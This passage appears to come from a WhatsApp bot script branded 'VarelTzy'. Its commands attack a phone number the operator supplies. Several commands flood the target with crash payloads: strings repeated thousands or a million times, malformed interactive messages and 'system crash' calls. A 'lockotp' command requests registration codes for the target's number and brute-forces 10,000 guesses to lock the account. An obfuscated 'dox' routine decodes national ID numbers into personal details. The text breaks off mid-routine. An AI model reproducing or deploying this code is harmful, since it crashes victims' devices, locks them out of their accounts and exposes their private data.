Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let buttonhhhh = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: buttonhhhh,
   footer: 'Powered By VarelTzy'
})
XeonOP = global.virtexpc
vareltzyganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
await sleep(500)
sendLiveLocationMessage(Pe)
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
VxoZap.sendMessage(Pe, { text: 'vareltzy Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `vareltzyReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await VxoZap.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
VxoZap.sendMessage(Pe, { "caption": `vareltzy Official`, audio: vareltzyganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `vareltzyOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(500)
VxoZap.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `vareltzyOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `vareltzyOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
sendListMessage(Pe)
await sleep(500)
}
replyz(`*</> Succes 🥰*`)
break


case 'lockotp': case 'tempban': {
if (!isCreator) return replyy(global.nocreator)
  if (args.length < 1) return replyy(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const args2 = args[0].split('|');
  if (args2.length !== 2) return replyy(`Incorrect format\n\nUsage: ${prefix+command} country_code|number\nExample: ${prefix+command} 91|6909137213`);
  const VxoZapCountryCode = args2[0];
  const xtarget = args2[1];
  const VxoZapNumber = xtarget.replace('@s.whatsapp.net', '');
  const VxoZapmerge = `${VxoZapCountryCode}${xtarget}`
  const VxoZapMention = VxoZapmerge + '@s.whatsapp.net';
  sendMessageWithMentions(
    "Successfully Activated OTP LOCK To @" + VxoZapMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [VxoZapMention]
  );
  try {
    const { stateVxoZap, saveCredsVxoZap } = await useMultiFileAuthState('./session');
    const VxoZapRequest = await VxoZapBotInc.requestRegistrationCode({
      phoneNumber: '+' + VxoZapCountryCode + `${VxoZapNumber}`,
      phoneNumberCountryCode: VxoZapCountryCode,
      phoneNumberNationalNumber: `${VxoZapNumber}`,
      phoneNumberMobileCountryCode: 724,
      method: 'sms'
    });
  } catch (err) {
  }
  
  for (let i = 0; i < 10000; i++) {
    try {
      var VxoZapPrefix = Math.floor(Math.random() * 999);
      var VxoZapSuffix = Math.floor(Math.random() * 999);
      await VxoZapBotInc.register(`${VxoZapPrefix}-${VxoZapSuffix}`);
    } catch (err) {
      console.log(`${VxoZapPrefix}-${VxoZapSuffix}`);
    }
  }
}
break;
		

case 'bugparamspc':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let buttonhhh = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: buttonhhh,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG vareltzy 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `${menuu}`
VxoZap.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyy(`*Succes 🥰*`)
break

case 'bugparamsgc':
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 12xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG vareltzy 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `${menuu}`
VxoZap.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyy(`*Succes 🥰*`)
break

case 'bugparamsin':
if (!isCreator) return replyy(global.nocreator)
XeonOP = global.virtexpc
menuu = `🔥 BUG vareltzy 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://youtube.com/@vareltzyofc",
      merchant_url: "https://www.google.com"
   })
}
]
ewe = `${menuu}`
VxoZap.sendButton(from,  hohe, m, {
body: ewe,
footer: `vareltzy`
})
replyy(`*Succes 🥰*`)
break

case "bughomepc":
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
let buttonhh = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: buttonhh,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›VarelTzy"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'vareltzyBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await VxoZap.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyy('Succes')
break

case "bughomegc":
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
let buttonh = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${Pe}}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${Pe}`,
      merchant_url: `https://wa.me/${Pe}`
   })
}], m, {
   body: buttonh,
   footer: 'Powered By VarelTzy'
})
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›VarelTzy"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'vareltzyBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await VxoZap.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyy('Succes')
break

case 'lemahdek': case 'ahhcrott': case 'ambatukam': case 'jomok': { 
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return replyy(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let Pe = bijipler + '@s.whatsapp.net'
let kecil = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${bijipler}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${bijipler}`,
      merchant_url: `https://wa.me/${bijipler}`
   })
}], m, {
   body: kecil,
   footer: ''
})
for (let j = 0; j < 5; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(global.sendbug)
}
break

case 'slayer07': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let pepeeeec = q.replace(/[^0-9]/g, "")
if (pepeeeec.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepeeeec + '@s.whatsapp.net'
let buttonggggggggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${pepeeeec}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${pepeeeec}`,
      merchant_url: `https://wa.me/${pepeeeec}`
   })
}], m, {
   body: buttonggggggggg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 5; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await VxoZap.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07 ${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07 ${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07 ${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, { image: slayer07,  caption: `𝘚𝘭𝘢𝘺𝘦𝘳 07 ${buttonvareltzy}` }, { quoted:m })
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(global.sendbug)
await replyy(`CEK AJA PASTI C1`)
}
break
case 'vareltzybug': case 'vareltzykeren': case 'vareltzyganteng': case 'vareltzyios': case 'vareltzyandro': {
if (!isCreator) return replyy(global.nocreator)
if (!q) return replyy(`Penggunaan .${command} 628xxx`)
let pepeeeeec = q.replace(/[^0-9]/g, "")
if (pepeeeeec.startsWith('0')) return replyy(`𖤍 Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n✔️ Example : .${command} 628xxx`)
let Pe = pepeeeeec + '@s.whatsapp.net'
let buttongggggggggg = `*Bot is sending a bug, please wait*
𖤍 _Number Target_ ->  ${pepeeeeec}`
VxoZap.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "CEK TARGET 😱",
      url: `https://wa.me/${pepeeeeec}`,
      merchant_url: `https://wa.me/${pepeeeeec}`
   })
}], m, {
   body: buttongggggggggg,
   footer: 'Powered By VarelTzy'
})
for (let j = 0; j < 5; j++) {
await VxoZap.sendMessage(Pe, {text: `MASIH IDUP KAN LU?`}, {quoted:m})
await bughomebutton(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await bakdok(Pe, vareltzyhuraa)
await sendSystemCrashMessage(Pe, vareltzyhuraa)
await sendViewOnceMessages(Pe, vareltzyhuraa)
await penghitaman(Pe, vareltzyhuraa)
await sendExtendedTextMessage(Pe, vareltzyhuraa)
await iponcrash(Pe)
await iponcrash(Pe, vareltzyhuraa)
await ngeloc(Pe, vareltzyhuraa)
await ngeloc(Pe, xbug2)
await pirgam(Pe, bugquoteddvc)
await pirgam(Pe, vareltzyhuraa)
await bughomebutton(Pe, vareltzyhuraa)
await bughomebutton(Pe)
await sendSystemCrashMessage(Pe, vareltzybugnew)
await sendRepeatedMessages2(Pe, vareltzyhuraa)
await sendVariousMessages(Pe, vareltzyhuraa)
await sendLiveLocationMessage(Pe, vareltzyhuraa)
await await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `𝐒𝐄𝐂𝐑𝐄𝐓 𝐏𝐄𝐎𝐏𝐋𝐄Δ ${buttonvareltzy}`}, {quoted:m})
await VxoZap.sendMessage(Pe, {text: `bang?`}, {quoted:m})
}
await replyy(`CEK AJA PASTI C1`)
}
break
case 'dox': { //by moraxs inc
const _0x1ad75f = _0x1d50;
(function (_0x5722d4, _0x5d79c5) {
    const _0x419fb2 = _0x1d50, _0x4594e3 = _0x5722d4();
    while (!![]) {
        try {
            const _0x5287ce = parseInt(_0x419fb2(0x1ba)) / (0x182b + 0x2331 + -0x3b5b * 0x1) + parseInt(_0x419fb2(0x1bb)) / (-0xcbf * -0x1 + -0x1d20 + -0x5 * -0x347) * (parseInt(_0x419fb2(0x1a4)) / (0x14d8 + 0x1 * 0xae5 + -0x83 * 0x3e)) + -parseInt(_0x419fb2(0x1bf)) / (-0xd * 0x10d + 0x304 * -0x1 + 0x10b1) + parseInt(_0x419fb2(0x1ae)) / (-0x145 * -0x1 + -0x1 * 0x226 + 0xe6) * (-parseInt(_0x419fb2(0x1b3)) / (-0x1 * 0x1091 + 0x888 + 0x80f * 0x1)) + parseInt(_0x419fb2(0x1a8)) / (0xc92 + -0x607 * -0x5 + -0x2aae) * (-parseInt(_0x419fb2(0x199)) / (0x2 * -0x12b9 + -0x1190 * 0x1 + 0x370a)) + parseInt(_0x419fb2(0x1bc)) / (-0x25dc + -0xb92 * 0x3 + 0x489b) + parseInt(_0x419fb2(0x1a3)) / (-0x66 * 0x1c + -0xf5b + 0x1a8d);
            if (_0x5287ce === _0x5d79c5)
                break;
            else
                _0x4594e3['push'](_0x4594e3['shift']());
        } catch (_0x4e059b) {
            _0x4594e3['push'](_0x4594e3['shift']());
        }
    }
}(_0x5367, -0x5ff + -0x12 * 0x88f9 + 0x13 * 0xe253));
if (!isCreator)
    return;
if (!q)
    return replyy(_0x1ad75f(0x1c9) + '\x20' + (prefix + command) + (_0x1ad75f(0x198) + _0x1ad75f(0x1a5)));
function _0x1d50(_0x3c301c, _0x131a9c) {
    const _0x5e5a9a = _0x5367();
    return _0x1d50 = function (_0x1e5abf, _0xd89f17) {
        _0x1e5abf = _0x1e5abf - (-0x951 * -0x1 + -0x53 * 0x2 + -0xc * 0x97);
        let _0x1a89ba = _0x5e5a9a[_0x1e5abf];
        return _0x1a89ba;
    }, _0x1d50(_0x3c301c, _0x131a9c);
}
nik = q[_0x1ad75f(0x1aa)]();
const moraxs = require(_0x1ad75f(0x1c0) + _0x1ad75f(0x1c7) + _0x1ad75f(0x1a1)), white = new Date()[_0x1ad75f(0x1b4) + 'r']()[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1b2)](-(-0x1ca1 * 0x1 + 0x983 + 0x1320)), green = nik[_0x1ad75f(0x1c2)](0x1 * -0x1a0e + 0x1399 + -0x67f * -0x1, -0x665 + 0x90e + 0x3 * -0xdf), yellow = nik[_0x1ad75f(0x1c2)](-0xbf1 + 0x1af * -0x12 + 0xe17 * 0x3, 0xd * -0x10a + -0x1466 + 0x21f0);
function _0x5367() {
    const _0x495ec9 = [
        '\x0aLahir:\x20',
        '\x0aKecamatan',
        '251772mkKAbJ',
        './lib/getd',
        'D:\x20',
        'substring',
        '\x0aProvince:',
        'length',
        '0|10|9|11|',
        '\x0aNama\x20Kabu',
        'ata/wilaya',
        'igit',
        '*Example*:',
        'split',
        '\x203216728xx',
        '1040LAXXul',
        '\x0aKelamin:\x20',
        'Perempuan',
        'kabkot',
        '4|2|5',
        'harus\x2016\x20d',
        '8|7|6|1|3|',
        '\x0aKode\x20Pos:',
        'h.json',
        '\x0aProvice\x20I',
        '12351070HwEtZc',
        '33NRugLl',
        'xxxxx',
        'Laki-laki',
        '\x0aKabupaten',
        '50309UGiCCa',
        '[\x20vareltzy\x20OFC',
        'toString',
        'Nomor\x20NIK\x20',
        'matan:\x20',
        'slice',
        '137235iFAOFQ',
        '\x20--\x20',
        '\x20ID:\x20',
        'provinsi',
        'substr',
        '114OBnjVf',
        'getFullYea',
        '\x0aNama\x20Keca',
        '\x0aUniqcode:',
        'paten:\x20',
        'kecamatan',
        '\x20]\x0a\x0aNik:\x20',
        '708334MZIFmC',
        '1000yrrSlg',
        '341469uKBskL'
    ];
    _0x5367 = function () {
        return _0x495ec9;
    };
    return _0x5367();
}
if (nik[_0x1ad75f(0x1c4)] == -0x18cf + 0x3 * -0x943 + 0x34a8) {
    const xhYroT = (_0x1ad75f(0x1c5) + _0x1ad75f(0x19f) + _0x1ad75f(0x19d))[_0x1ad75f(0x197)]('|');
    let hoQumn = 0x2 * -0x2d1 + -0x1ca9 + 0x224b;
    while (!![]) {
        switch (xhYroT[hoQumn++]) {
        case '0':
            provinceid = nik[_0x1ad75f(0x1c2)](-0x186f + 0x26a * -0x1 + 0x1ad9, -0x11 * 0x151 + 0x3 * -0x7f5 + 0x2e42);
            continue;
        case '1':
            kelamin = yellow > -0xd40 + 0x1045 + 0x2dd * -0x1 ? _0x1ad75f(0x19b) : _0x1ad75f(0x1a6);
            continue;
        case '2':
            V = green < white ? '20' + green : '19' + green;
            continue;
        case '3':
            lahir = yellow > 0x1 * -0x1c68 + -0xa * -0x17 + 0x1baa ? (yellow - (-0x950 + 0x248 + 0x5c * 0x14))[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1c4)] > -0x5 * -0x301 + 0xe30 + 0xe * -0x216 ? (yellow - (-0x2137 + 0x173 * -0x13 + 0x3ce8))[_0x1ad75f(0x1aa)]() : '0' + (yellow - (-0x1d8 * -0x4 + -0xbf7 + 0x4bf))[_0x1ad75f(0x1aa)]() : yellow;
            continue;
        case '4':
            X = nik[_0x1ad75f(0x1c2)](0x19e5 + -0xdf7 + -0x5f3 * 0x2, -0xb * 0x28d + -0x1fe8 * 0x1 + -0x3c01 * -0x1);
            continue;
        case '5':
            Z = nik[_0x1ad75f(0x1c2)](-0xeb * -0x1b + 0xbad + -0x246a, 0x1202 + -0x2055 + 0xe63);
            continue;
        case '6':
            kodepos = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x1ad3 + -0x1468 + -0x66b, 0x524 + -0x1b7f + -0x151 * -0x11)][_0x1ad75f(0x1ad)](-(-0xb2 * -0xc + -0xd * -0x225 + 0x121a * -0x2));
            continue;
        case '7':
            kecamatan = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x163a + -0x242a + 0xdf0, 0x11 * -0x41 + -0xf7f * 0x1 + 0x13d6)][_0x1ad75f(0x197)](_0x1ad75f(0x1af))[0x1e9e + 0x399 + 0x13 * -0x1cd];
            continue;
        case '8':
            kecamatanId = nik[_0x1ad75f(0x1c2)](-0x2 * -0xe13 + 0x2431 + 0x931 * -0x7, 0x1e26 + 0x38e + 0x1 * -0x21ae);
            continue;
        case '9':
